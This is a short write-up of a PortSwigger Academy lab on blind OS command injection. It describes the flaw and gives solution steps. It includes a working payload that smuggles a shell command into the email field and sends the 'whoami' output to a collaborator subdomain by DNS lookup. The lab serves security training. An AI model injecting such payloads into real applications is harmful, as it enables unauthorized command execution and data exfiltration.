# Lab: Blind OS command injection with out-of-band data exfiltration

**Official PortSwigger URL:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

## Lab idea

This challenge builds on blind command injection where the response provides no command output. Its high-level objective is to retrieve information about the running user through an out-of-band DNS interaction, practicing the distinction between merely detecting execution and conveying command output through an external signal. [1]

[1]: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration "Lab: Blind OS command injection with out-of-band data exfiltration"

## Vulnerability in brief
OS command injection, also known as shell injection, is a vulnerability that lets an attacker cause an application server to run unintended operating-system commands. It commonly occurs when an application builds or invokes a shell command using user-controlled values without keeping those values safely separate from command syntax. Shell metacharacters or substitutions can then change how the command is interpreted.

## Solution idea
1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the Collaborator tab.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
4. Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated: email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
5. Go back to the Collaborator tab, and click "Poll now".
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab.
7. To complete the lab, enter the name of the current user.

## Payloads / key values
- `email`
- ``email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``

## Official source
- [PortSwigger Academy: Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
